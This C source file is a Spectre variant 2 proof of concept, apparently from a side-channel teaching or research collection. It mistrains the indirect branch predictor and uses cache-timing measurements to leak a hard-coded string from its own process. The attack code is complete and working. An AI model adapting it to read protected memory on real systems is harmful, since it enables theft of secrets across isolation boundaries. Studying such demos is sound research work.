#include "../cache.h"
#include <emmintrin.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

size_t *target;
char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;

char *secret = "The answer is 42";

/// The gadget function is used to mistrain the target of the indirect call
size_t gadget(char *addr) { return probe[*addr * CACHE_LINE_SIZE]; }

/// function that makes indirect call
/// note that addr will be passed to gadget via %rdi
int noinline victim(char *addr, int input) {
  int junk = 0;
  /// set up branch history buffer (bhb) by performing >29 taken branches see
  /// https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
  ///   for details about how the branch prediction mechanism works
  /// junk and input used to guarantee the loop is actually run
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  // call *target
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r"(result)
                 : "r"(*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result & junk;
}

int safe_target() { return 42; }

char spectre_v2(char *addr_to_read) {
  size_t hits[256] CACHE_LINE_ALIGNED = {0};

  /// Initialize the probe array and the counters. The probe array is used to
  /// determine the value of the speculative read by checking if an element of
  /// it is in the cache.
  /// This is used like a LUT to determine the value of the speculative read.
  ///
  /// Since the attack is non-deterministic, the attack is repeated multiple
  /// times to ensure success, we save the results of each attack in the `hits`
  /// array.
  for (size_t i = 0; i < 256; i++) {
    hits[i] = 0;
    probe[i * CACHE_LINE_SIZE] = 1;
  }

  for (size_t try = 0; try < 1000; try++) {
    *target = (size_t)&gadget;

    /// Poison the branch predictor to always perform the indirect call
    _mm_mfence();
    int junk = 0;
    for (size_t i = 0; i < 30; i++) {
      junk ^= victim("$", 0);
    }
    _mm_mfence();

    /// Flush the probe array from the cache
    for (size_t i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }
    _mm_mfence();

    *target = (size_t)&safe_target;
    _mm_mfence();

    /// Flush the target from the cache
    _mm_clflush((void *)target);
    _mm_mfence();

    /// Perform the attack
    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    /// Time the reads
    measure_cache(probe, hits);
    int read = valid_read(hits, 256);
    if (read != -1) {
      return (char)read;
    }
  }

  return 0;
}

int main(int argc, char *argv[]) {
  target = malloc(sizeof(size_t));

  char *addr = secret;
  int len = strlen(secret);

  printf("Reading %d bytes starting at %p:\n", 1, &target);
  while (--len >= 0) {
    printf("reading %p...", addr);
    char value = spectre_v2(addr++);
    printf("0x%02X='%c'\n", value, (value > 31 && value < 127 ? value : '?'));
  }
  printf("\n");

  free((void *)target);

  return 0;
}
